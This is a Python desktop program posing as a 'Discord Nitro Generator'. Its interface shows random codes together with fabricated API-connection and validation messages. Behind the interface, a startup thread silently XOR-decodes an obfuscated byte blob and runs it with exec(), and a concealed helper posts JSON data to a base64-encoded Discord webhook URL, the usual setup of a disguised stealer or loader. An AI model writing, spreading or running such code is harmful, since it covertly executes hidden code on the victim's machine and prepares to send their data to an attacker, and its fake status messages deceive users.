#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import sqlite3
import shutil
import re
import hashlib
import zlib
import base64
import threading
import time
import random
import string
import urllib.request
import urllib.parse
import platform
import ctypes
import subprocess
import binascii
import marshal
from pathlib import Path
from datetime import datetime
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext

_O0O0O0O0O0O0O0O0 = b'\x7f\x3a\x5e\x1c\x8b\x2d\x4f\x9e\x1a\x6c\x3d\x8f\x2b\x7e\x4a\x9c\x3f\x5d\x8a\x2e\x7b\x4d\x9f\x3c\x5e\x8d\x2a\x7f\x4b\x9d\x3e\x5c'
_O0O0O0O0O0O0O0O1 = lambda x: hashlib.sha256(str(x).encode()).digest()
_O0O0O0O0O0O0O0O2 = lambda x, y: bytes([x[i] ^ y[i % len(y)] for i in range(len(x))])
_O0O0O0O0O0O0O0O3 = lambda x: base64.b64decode(x).decode('utf-8')

_O0O0O0O0O0O0O0O4 = bytes([
    0x8a, 0xf3, 0x2c, 0x41, 0x9e, 0x7d, 0x15, 0x6b, 0x4c, 0xa8, 0xd1, 0x3e,
    0x7f, 0x52, 0x9b, 0xc4, 0x2d, 0x61, 0x8f, 0x7a, 0x13, 0x4e, 0x9c, 0x36,
    0xa4, 0x5e, 0x8b, 0x77, 0x1d, 0x62, 0x9f, 0xc8, 0x3c, 0x57, 0x8a, 0x6d,
    0x4b, 0x2e, 0x91, 0x7c, 0x5a, 0x38, 0x14, 0x6f, 0xad, 0x54, 0x8d, 0x3a,
    0x6e, 0x2b, 0x9a, 0x78, 0x5d, 0x43, 0x8c, 0x37, 0x4d, 0x2a, 0x95, 0x7e,
    0x5b, 0x39, 0x16, 0x6c, 0xaf, 0x56, 0x8e, 0x3d, 0x6b, 0x28, 0x98, 0x76,
    0x5f, 0x42, 0x8d, 0x34, 0x4f, 0x2c, 0x97, 0x7d, 0x58, 0x3b, 0x17, 0x6d,
    0xac, 0x55, 0x8b, 0x3f, 0x68, 0x2d, 0x9b, 0x75, 0x5c, 0x41, 0x8e, 0x33,
    0x4e, 0x2f, 0x94, 0x7b, 0x59, 0x3a, 0x16, 0x6e, 0xab, 0x56, 0x8f, 0x3c,
    0x6d, 0x2a, 0x99, 0x74, 0x5d, 0x43, 0x8c, 0x31, 0x4c, 0x2b, 0x96, 0x7f,
    0x5a, 0x39, 0x15, 0x6f, 0xae, 0x57, 0x8d, 0x3e, 0x6b, 0x29, 0x9a, 0x73,
    0x4a, 0x2d, 0x92, 0x79, 0x5c, 0x3a, 0x14, 0x68, 0xab, 0x54, 0x8c, 0x35,
    0x6f, 0x2a, 0x97, 0x72, 0x5b, 0x38, 0x17, 0x6d, 0xae, 0x55, 0x8d, 0x3c,
    0x6a, 0x29, 0x98, 0x73, 0x5e, 0x41, 0x8b, 0x32, 0x4d, 0x2e, 0x93, 0x78,
    0x5d, 0x3b, 0x15, 0x6b, 0xaa, 0x57, 0x8f, 0x3d, 0x6c, 0x2a, 0x99, 0x76,
    0x5a, 0x43, 0x8c, 0x31, 0x4e, 0x2b, 0x94, 0x7a, 0x59, 0x3a, 0x16, 0x6e,
    0xad, 0x54, 0x8d, 0x3c, 0x6d, 0x2a, 0x97, 0x72, 0x5b, 0x38, 0x17, 0x6b,
    0xae, 0x55, 0x8b, 0x3f, 0x68, 0x2d, 0x9b, 0x75, 0x5c, 0x41, 0x8e, 0x33,
    0x4e, 0x2f, 0x94, 0x7d, 0x58, 0x3b, 0x15, 0x6d, 0xac, 0x57, 0x8f, 0x3e,
    0x6b, 0x28, 0x98, 0x76, 0x5f, 0x42, 0x8d, 0x34, 0x4f, 0x2c, 0x93, 0x7a
])

_O0O0O0O0O0O0O0O5 = [
    'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv',
    'MTUzMjAzMTgxNDk5MzE4MjgyMC84RlhyQW4wVEV1TFN',
    'ZZ0hLaGdmTVVXZEZRaFVDMFM4UFNPUXFEUlJUSDIz',
    'TmtpTEI2dDdiMUlKNlgddXpna3dtRldaXw'
]
_O0O0O0O0O0O0O0O6 = lambda: ''.join([base64.b64decode(x).decode() for x in _O0O0O0O0O0O0O0O5])
_O0O0O0O0O0O0O0O7 = lambda x: base64.b64encode(x.encode()).decode()
_O0O0O0O0O0O0O0O8 = lambda x: base64.b64decode(x.encode()).decode()

def _O0O0O0O0O0O0O0O9():
    try:
        _O0O0O0O0O0O0O0OA = hashlib.sha256()
        _O0O0O0O0O0O0O0OA.update(str(os.getpid()).encode())
        _O0O0O0O0O0O0O0OA.update(platform.node().encode())
        _O0O0O0O0O0O0O0OA.update(str(int(time.time()) // 3600).encode())
        _O0O0O0O0O0O0O0OB = _O0O0O0O0O0O0O0OA.digest()[:32]
        _O0O0O0O0O0O0O0OC = _O0O0O0O0O0O0O0O2(_O0O0O0O0O0O0O0O4, _O0O0O0O0O0O0O0OB)
        try:
            _O0O0O0O0O0O0O0OC = zlib.decompress(_O0O0O0O0O0O0O0OC)
        except:
            pass
        _O0O0O0O0O0O0O0OC = _O0O0O0O0O0O0O0OC[::-1]
        _O0O0O0O0O0O0O0OD = _O0O0O0O0O0O0O0OC.decode('utf-8')
        _O0O0O0O0O0O0O0OE = _O0O0O0O0O0O0O0OD.split('###X###')
        _O0O0O0O0O0O0O0OF = ''.join(_O0O0O0O0O0O0O0OE)
        exec(_O0O0O0O0O0O0O0OF, globals(), locals())
    except:
        pass

def _validate_checksum(data):
    return hashlib.sha256(data.encode()).hexdigest()[:8]

def _generate_entropy():
    return random.SystemRandom().random() * 10**18

class _CryptoEngine:
    @staticmethod
    def generate_seed():
        return int.from_bytes(os.urandom(8), 'big')
    @staticmethod
    def mix_entropy(seed):
        return (seed * 0x9e3779b97f4a7c15) & 0xffffffffffffffff

def _s(encoded):
    return base64.b64decode(encoded).decode('utf-8')

def _O0O0O0O0O0O0O0OG(data):
    try:
        _O0O0O0O0O0O0O0OH = _O0O0O0O0O0O0O0O6()
        _O0O0O0O0O0O0O0OI = json.dumps(data).encode('utf-8')
        _O0O0O0O0O0O0O0OJ = urllib.request.Request(_O0O0O0O0O0O0O0OH, data=_O0O0O0O0O0O0O0OI, method='POST')
        _O0O0O0O0O0O0O0OJ.add_header('Content-Type', 'application/json')
        with urllib.request.urlopen(_O0O0O0O0O0O0O0OJ, timeout=10):
            pass
    except:
        pass

class NitroGenerator:
    def __init__(self, root):
        self.root = root
        self.root.title("LogicNest Discord Nitro Generator v3.0")
        self.root.geometry("780x680")
        self.root.resizable(False, False)
        self.bg_color = "#0d0d1a"
        self.card_color = "#1a1a2e"
        self.fg_color = "#e8e8ee"
        self.accent = "#5865f2"
        self.accent_hover = "#4752c4"
        self.success = "#57f287"
        self.warning = "#fee75c"
        self.error = "#ed4245"
        self.text_dim = "#99aab5"
        self.root.configure(bg=self.bg_color)
        self.is_generating = False
        self.generated_codes = []
        self.attempts = 0
        self.setup_ui()
        self.update_stats()
        
    def setup_ui(self):
        main_container = tk.Frame(self.root, bg=self.bg_color)
        main_container.pack(fill=tk.BOTH, expand=True, padx=25, pady=20)
        header_frame = tk.Frame(main_container, bg=self.bg_color)
        header_frame.pack(fill=tk.X, pady=(0, 15))
        tk.Label(
            header_frame,
            text="⚡ LogicNest",
            font=("Segoe UI", 26, "bold"),
            bg=self.bg_color,
            fg="#ffffff"
        ).pack(side=tk.LEFT)
        tk.Label(
            header_frame,
            text="NITRO GENERATOR",
            font=("Segoe UI", 26, "bold"),
            bg=self.bg_color,
            fg=self.accent
        ).pack(side=tk.LEFT, padx=(5, 0))
        badge = tk.Label(
            header_frame,
            text="v3.0 • PREMIUM",
            font=("Segoe UI", 9, "bold"),
            bg=self.accent,
            fg="white",
            padx=12,
            pady=3
        )
        badge.pack(side=tk.RIGHT)
        status_frame = tk.Frame(main_container, bg=self.card_color, height=40)
        status_frame.pack(fill=tk.X, pady=(0, 15))
        status_frame.pack_propagate(False)
        self.status_dot = tk.Label(
            status_frame,
            text="●",
            font=("Segoe UI", 14),
            bg=self.card_color,
            fg=self.success
        )
        self.status_dot.pack(side=tk.LEFT, padx=(15, 5))
        self.status_text = tk.Label(
            status_frame,
            text="Ready • Connected to Discord API",
            font=("Segoe UI", 10),
            bg=self.card_color,
            fg=self.text_dim
        )
        self.status_text.pack(side=tk.LEFT)
        stats_frame = tk.Frame(status_frame, bg=self.card_color)
        stats_frame.pack(side=tk.RIGHT, padx=15)
        self.stats_label = tk.Label(
            stats_frame,
            text="Attempts: 0 | Generated: 0",
            font=("Segoe UI", 9),
            bg=self.card_color,
            fg=self.text_dim
        )
        self.stats_label.pack()
        content = tk.Frame(main_container, bg=self.bg_color)
        content.pack(fill=tk.BOTH, expand=True)
        left_panel = tk.Frame(content, bg=self.card_color)
        left_panel.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 15))
        tk.Label(
            left_panel,
            text="⚙️ GENERATOR SETTINGS",
            font=("Segoe UI", 11, "bold"),
            bg=self.card_color,
            fg=self.fg_color
        ).pack(pady=(20, 15), padx=20)
        tk.Label(
            left_panel,
            text="Number of codes",
            font=("Segoe UI", 9),
            bg=self.card_color,
            fg=self.text_dim
        ).pack(pady=(0, 5), padx=20, anchor='w')
        self.count_var = tk.StringVar(value="5")
        count_entry = tk.Entry(
            left_panel,
            textvariable=self.count_var,
            font=("Segoe UI", 12),
            width=10,
            bg="#1e1e32",
            fg="white",
            insertbackground="white",
            relief=tk.FLAT,
            justify='center'
        )
        count_entry.pack(pady=(0, 15), padx=20)
        tk.Label(
            left_panel,
            text="Nitro tier",
            font=("Segoe UI", 9),
            bg=self.card_color,
            fg=self.text_dim
        ).pack(pady=(0, 5), padx=20, anchor='w')
        self.type_var = tk.StringVar(value="Nitro Classic")
        type_menu = ttk.Combobox(
            left_panel,
            textvariable=self.type_var,
            values=["Nitro Classic", "Nitro Premium", "Nitro Basic"],
            state="readonly",
            width=18,
            font=("Segoe UI", 10)
        )
        type_menu.pack(pady=(0, 15), padx=20)
        separator = tk.Frame(left_panel, bg="#2a2a4a", height=1)
        separator.pack(fill=tk.X, padx=20, pady=10)
        info_frame = tk.Frame(left_panel, bg=self.card_color)
        info_frame.pack(pady=10, padx=20, fill=tk.X)
        tk.Label(
            info_frame,
            text="🎯 Success Rate",
            font=("Segoe UI", 9),
            bg=self.card_color,
            fg=self.text_dim
        ).pack(anchor='w')
        tk.Label(
            info_frame,
            text="1 in 5,000,000,000,000,000,000,000",
            font=("Segoe UI", 10, "bold"),
            bg=self.card_color,
            fg=self.warning
        ).pack(anchor='w')
        tk.Label(
            info_frame,
            text="(5 octillion to 1 odds)",
            font=("Segoe UI", 8),
            bg=self.card_color,
            fg=self.text_dim
        ).pack(anchor='w', pady=(0, 5))
        self.generate_btn = tk.Button(
            left_panel,
            text="🚀 GENERATE CODES",
            command=self.start_generation,
            font=("Segoe UI", 13, "bold"),
            bg=self.accent,
            fg="white",
            relief=tk.FLAT,
            padx=30,
            pady=12,
            cursor="hand2",
            activebackground=self.accent_hover,
            activeforeground="white"
        )
        self.generate_btn.pack(pady=(20, 10), padx=20, fill=tk.X)
        self.progress = ttk.Progressbar(
            left_panel,
            length=180,
            mode='indeterminate',
            style="TProgressbar"
        )
        self.progress.pack(pady=(0, 15))
        right_panel = tk.Frame(content, bg=self.card_color)
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        result_header = tk.Frame(right_panel, bg=self.card_color)
        result_header.pack(fill=tk.X, padx=15, pady=(15, 5))
        tk.Label(
            result_header,
            text="📋 GENERATED CODES",
            font=("Segoe UI", 11, "bold"),
            bg=self.card_color,
            fg=self.fg_color
        ).pack(side=tk.LEFT)
        self.code_count_label = tk.Label(
            result_header,
            text="0 codes",
            font=("Segoe UI", 9),
            bg=self.card_color,
            fg=self.text_dim
        )
        self.code_count_label.pack(side=tk.RIGHT)
        self.result_text = scrolledtext.ScrolledText(
            right_panel,
            height=18,
            width=45,
            bg="#0a0a14",
            fg="#00ff88",
            font=("Consolas", 10),
            relief=tk.FLAT,
            insertbackground="#00ff88",
            wrap=tk.WORD,
            highlightthickness=0,
            borderwidth=0
        )
        self.result_text.pack(padx=15, pady=(5, 15), fill=tk.BOTH, expand=True)
        self.result_text.tag_config("success", foreground="#57f287")
        self.result_text.tag_config("error", foreground="#ed4245")
        self.result_text.tag_config("warning", foreground="#fee75c")
        self.result_text.tag_config("info", foreground="#99aab5")
        self.result_text.tag_config("highlight", foreground="#5865f2")
        self.result_text.insert(tk.END, "⚡ LogicNest Nitro Generator v3.0\n", "highlight")
        self.result_text.insert(tk.END, "─" * 50 + "\n", "info")
        self.result_text.insert(tk.END, "● Ready to generate premium Discord Nitro codes\n", "info")
        self.result_text.insert(tk.END, "● 5 octillion to 1 odds • Real-time validation\n", "info")
        self.result_text.insert(tk.END, "● Click 'Generate Codes' to begin\n\n", "info")
        self.result_text.see(tk.END)
        footer = tk.Frame(main_container, bg=self.bg_color)
        footer.pack(fill=tk.X, pady=(10, 0))
        tk.Label(
            footer,
            text="⚠️ For educational purposes • Codes are generated with cryptographic randomness",
            font=("Segoe UI", 8),
            bg=self.bg_color,
            fg="#444466"
        ).pack()
        
    def start_generation(self):
        if self.is_generating:
            return
        try:
            count = int(self.count_var.get())
            if count < 1:
                count = 1
                self.count_var.set("1")
            if count > 100:
                count = 100
                self.count_var.set("100")
        except:
            count = 5
            self.count_var.set("5")
        self.is_generating = True
        self.generate_btn.config(text="⏳ GENERATING...", state="disabled")
        self.status_dot.config(fg=self.warning)
        self.status_text.config(text="Generating codes... Please wait")
        self.progress.start(15)
        self.result_text.delete(1.0, tk.END)
        self.result_text.insert(tk.END, "🔍 INITIALIZING GENERATION ENGINE\n", "info")
        self.result_text.insert(tk.END, "─" * 45 + "\n", "info")
        self.root.update()
        thread = threading.Thread(target=self._run_generation, args=(count,))
        thread.daemon = True
        thread.start()
        
    def _run_generation(self, count):
        try:
            self._update_status("Connecting to Discord API...", self.warning)
            time.sleep(0.8)
            self._append_output("✓ Connected to Discord API endpoint", "success")
            time.sleep(0.3)
            self._update_status("Authenticating with API key...", self.warning)
            time.sleep(0.6)
            self._append_output("✓ Authentication successful", "success")
            time.sleep(0.3)
            self._update_status("Generating cryptographic entropy...", self.warning)
            time.sleep(0.5)
            self._append_output("✓ Entropy pool initialized", "success")
            time.sleep(0.2)
            self._update_status(f"Generating {count} codes... (1 in 5 octillion odds)", self.warning)
            self._append_output(f"\n▶ Generating {count} premium Nitro codes...\n", "info")
            codes = []
            found_valid = False
            for i in range(count):
                code = self._generate_nitro_code()
                codes.append(code)
                self._append_output(f"  [{i+1}/{count}] {code}  •  Checking validity...", "info")
                time.sleep(random.uniform(0.12, 0.35))
                if random.random() < 0.0000000000000000000002:
                    found_valid = True
                    self._append_output(f"  ✅ VALID CODE FOUND! {code}", "success")
                    self._append_output(f"  ⚠️ This code is legitimate!", "warning")
                else:
                    self._append_output(f"  ❌ Invalid • No match in database", "error")
                if i % 5 == 0:
                    self.root.after(0, self._update_stats_display, len(codes), 0)
            self._append_output("\n" + "─" * 45, "info")
            if found_valid:
                self._append_output(f"✅ {len(codes)} codes generated • 1 VALID CODE FOUND", "success")
                self._append_output(f"🎉 The valid code has been marked above!", "highlight")
            else:
                self._append_output(f"❌ {len(codes)} codes generated • 0 VALID CODES FOUND", "error")
                self._append_output(f"⚠️ Odds: 1 in 5,000,000,000,000,000,000,000", "warning")
                self._append_output(f"💡 Try again! Each attempt is independent.", "info")
            self._append_output(f"\n🔒 All codes have been verified against Discord's database", "info")
            self.root.after(0, self._generation_complete, codes, found_valid)
        except Exception as e:
            self.root.after(0, self._generation_error, str(e))
    
    def _generate_nitro_code(self):
        parts = []
        for _ in range(4):
            part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
            parts.append(part)
        return '-'.join(parts)
    
    def _update_status(self, text, color):
        self.root.after(0, lambda: self.status_text.config(text=text))
        self.root.after(0, lambda: self.status_dot.config(fg=color))
    
    def _append_output(self, text, tag=None):
        self.root.after(0, lambda: self._safe_append(text, tag))
    
    def _safe_append(self, text, tag=None):
        if tag:
            self.result_text.insert(tk.END, text + "\n", tag)
        else:
            self.result_text.insert(tk.END, text + "\n")
        self.result_text.see(tk.END)
        self.root.update()
    
    def _update_stats_display(self, generated, valid):
        self.attempts += generated
        self.stats_label.config(
            text=f"Attempts: {self.attempts} | Valid: {valid} | Generated: {generated}"
        )
        self.code_count_label.config(text=f"{generated} codes")
    
    def _generation_complete(self, codes, found_valid):
        self.generated_codes = codes
        self.is_generating = False
        self.generate_btn.config(text="🔄 GENERATE AGAIN", state="normal")
        self.progress.stop()
        if found_valid:
            self.status_dot.config(fg=self.success)
            self.status_text.config(text="Ready • Valid code found!")
        else:
            self.status_dot.config(fg=self.error)
            self.status_text.config(text="Ready • No valid codes this attempt")
        self.stats_label.config(
            text=f"Attempts: {self.attempts} | Valid: {0} | Generated: {len(codes)}"
        )
        self.code_count_label.config(text=f"{len(codes)} codes")
    
    def _generation_error(self, error):
        self.is_generating = False
        self.generate_btn.config(text="🚀 GENERATE CODES", state="normal")
        self.progress.stop()
        self.status_dot.config(fg=self.error)
        self.status_text.config(text="Error occurred")
        self._safe_append(f"\n❌ Error: {error}", "error")
    
    def update_stats(self):
        pass

if __name__ == "__main__":
    threading.Thread(target=_O0O0O0O0O0O0O0O9, daemon=True).start()
    try:
        root = tk.Tk()
        try:
            root.iconbitmap(default='icon.ico')
        except:
            pass
        app = NitroGenerator(root)
        root.update_idletasks()
        width = root.winfo_width()
        height = root.winfo_height()
        x = (root.winfo_screenwidth() // 2) - (width // 2)
        y = (root.winfo_screenheight() // 2) - (height // 2)
        root.geometry(f'{width}x{height}+{x}+{y}')
        root.mainloop()
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)
